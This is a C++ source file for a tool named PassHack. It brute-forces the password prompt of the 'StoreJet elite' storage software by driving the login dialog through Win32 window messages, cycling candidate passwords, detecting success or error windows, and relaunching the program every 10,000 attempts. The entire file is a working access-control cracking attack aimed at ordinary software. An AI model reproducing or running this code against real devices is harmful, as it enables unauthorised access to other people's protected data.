#include "PassHack.h"

#define MAX_WND_TEXT						256
#define MAX_PASS_LEN						15
#define MAIN_WINDOW_NAME					_T("StoreJet elite - Подключиться")
#define ERROR_WINDOW_NAME					_T("Ошибка")
#define OK_BUTTON_NAME						_T("Login")
#define CANCEL_BUTTON_NAME					_T("Cancel")

#define RESULT_WRONG_PASSWORD				0
#define RESULT_CORRECT_PASSWORD				1
#define RESULT_UNKNOWN						2


TCHAR *charset = _T(" abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-");
HANDLE ev = NULL;

Password::Password(TCHAR *char_set, DWORD len) : charset(char_set), pwd_len(len)
{
	charset_len = _tcslen(charset);
	max_index = charset_len - 1;
	pwd_byte = new BYTE[pwd_len];
	pwd_str = new TCHAR[pwd_len + 1];
	memset(pwd_byte, 0x00, sizeof(BYTE)*pwd_len);
	memset(pwd_str, 0x00, sizeof(TCHAR)*(pwd_len+1));
}

Password::~Password(void)
{
	delete pwd_byte;
	delete pwd_str;
}

BOOL Password::Roll(void)
{
	for (DWORD i = 0; i < pwd_len; i++)
	{
		if (pwd_byte[i] < max_index)
		{
			pwd_byte[i]++;
			return TRUE;
		}
		else
		{
			pwd_byte[i] = 0x00;
		}
	}
	return FALSE;
}

const TCHAR *Password::GetPasswordString(void)
{
	for (DWORD i = 0; i < pwd_len; i++)
	{
		pwd_str[i] = charset[pwd_byte[i]];
	}
	return pwd_str;
}

BOOL CALLBACK GetLoginButton(HWND hwnd, LPARAM lParam)
{
	TCHAR class_name[MAX_WND_TEXT] = {0};
	TCHAR wnd_text[MAX_WND_TEXT] = {0};
	::RealGetWindowClass(hwnd, class_name, MAX_WND_TEXT);
	if (_tcscmp(class_name, _T("Button")) == 0x00)
	{
		::GetWindowText(hwnd, wnd_text, MAX_WND_TEXT);
		if (_tcscmp(wnd_text, _T("Login")) == 0x00)
		{
			*(HWND *)lParam = hwnd;
			return FALSE;
		}
	}
	return TRUE;
}

BOOL CALLBACK GetCancelButton(HWND hwnd, LPARAM lParam)
{
	TCHAR class_name[MAX_WND_TEXT] = {0};
	TCHAR wnd_text[MAX_WND_TEXT] = {0};
	::RealGetWindowClass(hwnd, class_name, MAX_WND_TEXT);
	if (_tcscmp(class_name, _T("Button")) == 0x00)
	{
		::GetWindowText(hwnd, wnd_text, MAX_WND_TEXT);
		if (_tcscmp(wnd_text, _T("Cancel")) == 0x00)
		{
			*(HWND *)lParam = hwnd;
			return FALSE;
		}
	}
	return TRUE;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
{
	TCHAR class_name[MAX_WND_TEXT] = {0};
	::RealGetWindowClass(hwnd, class_name, MAX_WND_TEXT);
	if (_tcscmp(class_name, _T("Edit")) == 0x00)
	{
		*(HWND *)lParam = hwnd;
		return FALSE;
	}
	return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	TCHAR wnd_text[MAX_WND_TEXT] = {0};
	::GetWindowText(hwnd, wnd_text, MAX_WND_TEXT);
	if (_tcscmp(wnd_text, MAIN_WINDOW_NAME) == 0x00)
	{
		*(HWND *)lParam = hwnd;
		return FALSE;
	}
	return TRUE;
}

BOOL CALLBACK GetErrorWindow(HWND hwnd, LPARAM lParam)
{
	TCHAR wnd_text[MAX_WND_TEXT] = {0};
	::GetWindowText(hwnd, wnd_text, MAX_WND_TEXT);
	if (_tcscmp(wnd_text, ERROR_WINDOW_NAME) == 0x00)
	{
		*(HWND *)lParam = hwnd;
		return FALSE;
	}
	return TRUE;
}

BOOL CALLBACK GetEliteWindow(HWND hwnd, LPARAM lParam)
{
	TCHAR wnd_text[MAX_WND_TEXT] = {0};
	TCHAR class_name[MAX_WND_TEXT] = {0};
	::GetWindowText(hwnd, wnd_text, MAX_WND_TEXT);
	::RealGetWindowClass(hwnd, class_name, MAX_WND_TEXT);
	if (_tcscmp(wnd_text, _T("StoreJet elite")) == 0x00)
	{
		*(HWND *)lParam = hwnd;
		return FALSE;
	}
	return TRUE;
}

HWND GetStoreJetEdit(HWND main_wnd)
{
	HWND edit_wnd = NULL;
	::EnumChildWindows(main_wnd, EnumChildProc, (LPARAM )&edit_wnd);
	return edit_wnd;
}

HWND GetStoreJetMainWindow(void)
{
	HWND main_wnd = NULL;
	::EnumWindows(EnumWindowsProc, (LPARAM )&main_wnd);
	return main_wnd;
}

HWND GetStoreJetLoginButton(HWND main_wnd)
{
	HWND login_btn = NULL;
	::EnumChildWindows(main_wnd, GetLoginButton, (LPARAM)&login_btn);
	return login_btn;
}

HWND GetStoreJetCancelButton(HWND main_wnd)
{
	HWND cancel_btn = NULL;
	::EnumChildWindows(main_wnd, GetCancelButton, (LPARAM)&cancel_btn);
	return cancel_btn;
}

HWND GetStoreJetErrorWindow(void)
{
	HWND error_wnd = NULL;
	for (int i = 0; i < 10; i++)
	{
		EnumWindows(GetErrorWindow, (LPARAM)&error_wnd);
		if (error_wnd)
			break; 
	}
	return error_wnd;
}

HWND GetStoreJetEliteWindow(void)
{
	HWND wnd = NULL;
	for (int i = 0; i < 1000; i++)
	{
		EnumWindows(GetEliteWindow, (LPARAM)&wnd);
		if (wnd)
			break; 
	}
	return wnd;
}

void CloseStoreJetErrorWindow(HWND error_wnd)
{
	::SendMessage(error_wnd, WM_CLOSE, 0, 0);
}

DWORD GetResult()
{
	HWND pwd_wnd = NULL;
	HWND error_wnd = NULL;
	HWND main_wnd = NULL;
	HWND login_btn = NULL;

	while (TRUE)
	{
		if (pwd_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite - Подключиться")))
		{
			if (login_btn = GetStoreJetLoginButton(pwd_wnd))
			{
				::PostMessage(login_btn, BM_CLICK, 0, 0);
			}
		}

		for (DWORD i = 0; i < 100; i++)
		{
			error_wnd = ::FindWindow(_T("#32770"), _T("Ошибка"));
			if (error_wnd) return RESULT_WRONG_PASSWORD;

			main_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite"));
			if (main_wnd) return RESULT_CORRECT_PASSWORD;
		}
		//_tprintf(_T("GetResult(): WAIT\n"));
	}
	return RESULT_UNKNOWN;
}

void ClosePasswordWindow(void)
{
	HWND pwd_wnd = NULL;
	if (pwd_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite - Подключиться")))
	{
		do 
		{
			::SendMessage(pwd_wnd, WM_CLOSE, 0, 0);
			pwd_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite - Подключиться"));
		} while (pwd_wnd);
	} 	
}

void CloseErrorWindow(void)
{
	HWND error_wnd = NULL;
	if (error_wnd = ::FindWindow(_T("#32770"), _T("Ошибка")))
	{
		do 
		{
			::SendMessage(error_wnd, WM_CLOSE, 0, 0);
			error_wnd = ::FindWindow(_T("#32770"), _T("Ошибка"));
		} while (error_wnd);
	} 	
}

void CloseMainWindow(void)
{
	HWND main_wnd = NULL;
	if (main_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite")))
	{
		do 
		{
			::SendMessage(main_wnd, WM_CLOSE, 0, 0);
			main_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite"));
		} while (main_wnd);
	} 
}

int PassHackMain()
{
	HWND pwd_wnd = NULL;
	HWND error_wnd = NULL;
	HWND main_wnd = NULL;

	HWND pwd_edit = NULL;
	HWND cancel_btn = NULL;
	HWND ok_wnd = NULL;
	HWND splash_wnd = NULL;

	ev = CreateEvent(NULL, TRUE, FALSE, _T("StoreJet Event"));
	if (ev) _tprintf(_T("Event created\n"));
	else goto exit;

	pwd_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite - Подключиться"));
	if (pwd_wnd) _tprintf(_T("StoreJet Password window find\n"));
	else goto exit;

	pwd_edit = GetStoreJetEdit(pwd_wnd);
	if (pwd_edit) _tprintf(_T("Password Edit find\n"));
	else goto exit;

	for(int pwd_len = 1; pwd_len < MAX_PASS_LEN; pwd_len++)
	{
		Password pwd(charset, pwd_len);
		do
		{
			_tprintf(_T("%s\n"), pwd.GetPasswordString());
			if (!::SendMessage(pwd_edit, EM_REPLACESEL, (WPARAM)TRUE, (LPARAM)/*pwd.GetPasswordString()*/_T("aaa")))
				return 0;

			DWORD res = GetResult();
			switch (res)
			{
				case RESULT_CORRECT_PASSWORD:
					_tprintf(_T("Password found: \"%s\"\n"), pwd.GetPasswordString());
					goto exit;
					break;
				case RESULT_WRONG_PASSWORD:
					CloseErrorWindow();
					break;
				case RESULT_UNKNOWN:
					_tprintf(_T("Result unknown"));
					goto exit;
					break;
			}
		} while (pwd.Roll());
	}

exit:

	_tprintf(_T("\nDone. Press any key ..."));
	_getch();

	return 0;
}

HWND LoadStoreJetModule(TCHAR *module_full_name)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HWND pwd_wnd = NULL;

	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	do 
	{
		if (CreateProcess(_T("F:\\SJELITE3.EXE"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
		{
			for (int i = 0; i < 10; i++) 
			{
				WaitForSingleObject(ev, 500);
				pwd_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite - Подключиться"));
			}
		}
		else return pwd_wnd;
	} while (!pwd_wnd);
	return pwd_wnd;
}

void UnloadStoreJetModule(void)
{
	HWND pwd_wnd = NULL;
	HWND error_wnd = NULL;
	HWND main_wnd = NULL;

	do 
	{
		ClosePasswordWindow();
		CloseErrorWindow();
		CloseMainWindow();
		error_wnd = ::FindWindow(_T("#32770"), _T("Ошибка"));
		main_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite"));
		pwd_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite - Подключиться"));
	} while (error_wnd || main_wnd || pwd_wnd);
	_tprintf(_T("StoreJet module UNLOAD\n"));
}

BOOL InputPassword(const TCHAR *pwd)
{
	HWND pwd_wnd = NULL;
	HWND pwd_edit = NULL;

	pwd_wnd = ::FindWindow(_T("#32770"), _T("StoreJet elite - Подключиться"));
	if (pwd_wnd)
	{
		if (pwd_edit = GetStoreJetEdit(pwd_wnd))
		{
			if (::SendMessage(pwd_edit, EM_REPLACESEL, (WPARAM)TRUE, (LPARAM)pwd))
				return TRUE;
		}
	}
	return FALSE;
}

int BruteForce(TCHAR *module_full_name)
{
	HWND pwd_wnd = NULL;
	HWND pwd_edit = NULL;
	LONGLONG pwd_counter = 0;
	LONGLONG max_pwd_count = 10000;
	DWORD start_tick_count;
	DWORD curr_tick_count;

	HWND console_wnd = GetConsoleWindow();
	if (!console_wnd) goto exit;

	ev = CreateEvent(NULL, TRUE, FALSE, _T("StoreJet Event"));
	if (ev) _tprintf(_T("Event created\n"));
	else goto exit;

	if (pwd_wnd = LoadStoreJetModule(module_full_name)) _tprintf(_T("StoreJet module LOAD\n"));
	else goto exit;

	SetForegroundWindow(console_wnd);

	if (pwd_edit = GetStoreJetEdit(pwd_wnd)) _tprintf(_T("Password Edit find\n"));
	else goto exit;

	for(int pwd_len = 1; pwd_len < MAX_PASS_LEN; pwd_len++)
	{
		start_tick_count = GetTickCount();
		Password pwd(charset, pwd_len);
		do
		{
			pwd_counter++;

			if (pwd_counter >= max_pwd_count)
			{
				pwd_counter = 0;
				UnloadStoreJetModule();
				if (pwd_wnd = LoadStoreJetModule(module_full_name))
				{
					_tprintf(_T("StoreJet module LOAD\n"));
					SetForegroundWindow(console_wnd);
				}
				else goto exit;
			}

			if (!InputPassword(pwd.GetPasswordString()))
			{
				_tprintf(_T("Input password error"));
				goto exit;
			}
			//_tprintf(_T("%s\n"), pwd.GetPasswordString());

			DWORD res = GetResult();
			switch (res)
			{
			case RESULT_CORRECT_PASSWORD:
				_tprintf(_T("Password found: \"%s\"\n"), pwd.GetPasswordString());
				goto exit;
				break;
			case RESULT_WRONG_PASSWORD:
				CloseErrorWindow();
				break;
			case RESULT_UNKNOWN:
				_tprintf(_T("Result unknown"));
				goto exit;
				break;
			}
		} while (pwd.Roll());
		curr_tick_count = GetTickCount();
		_tprintf(_T("Password length: %d, %d sec\n"), pwd_len, (DWORD)(curr_tick_count - start_tick_count)/1000);
	}

exit:
	_tprintf(_T("\nDone. Press any key ..."));
	_getch();
	return 0;
}


// _T("StoreJet elite") SplashScreenExClass
// _T("StoreJet elite") #32770


// "StoreJet elite - Подключиться"; "#32770"
// "Ошибка"; "#32770"

// if Password OK
// "StoreJet elite"; "#32770"
//
